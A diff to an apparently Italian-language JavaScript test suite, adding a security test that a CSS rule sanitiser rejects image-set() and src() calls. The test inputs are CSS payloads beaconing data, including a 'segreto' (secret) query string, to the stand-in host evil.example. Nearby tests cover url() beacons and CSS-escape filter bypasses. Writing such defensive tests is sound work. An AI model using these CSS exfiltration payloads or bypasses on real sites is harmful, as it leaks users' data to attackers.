@@ -72,6 +72,17 @@ test('SICUREZZA: scarta url() (richiesta di rete dal CSS)', () => {
   assert.equal(R.normalizeRules({ selettore: 'body', css: 'background: url(http://evil/beacon.gif)' }).length, 0);
 });
 
+test('SICUREZZA: scarta image-set() e src() con l\'indirizzo come stringa nuda (#587)', () => {
+  for (const css of [
+    'background-image: image-set("https://evil.example/c?d=segreto" 1x)',
+    'background-image: -webkit-image-set("https://evil.example/c" 1x)',
+    'list-style-image: image-set(\'https://evil.example/c\' 1x)',
+    'background-image: src("https://evil.example/c")',
+  ]) {
+    assert.equal(R.normalizeRules({ selettore: 'body', css }).length, 0, css);
+  }
+});
+
 test('SICUREZZA: scarta url() camuffato con escape CSS (\\75rl, ur\\6c) — bypass del filtro', () => {
   // Il browser decodifica gli escape CSS: "\75rl(" e "ur\6c(" diventano "url(",
   // quindi partirebbe comunque una richiesta di rete verso l'attaccante. Se il
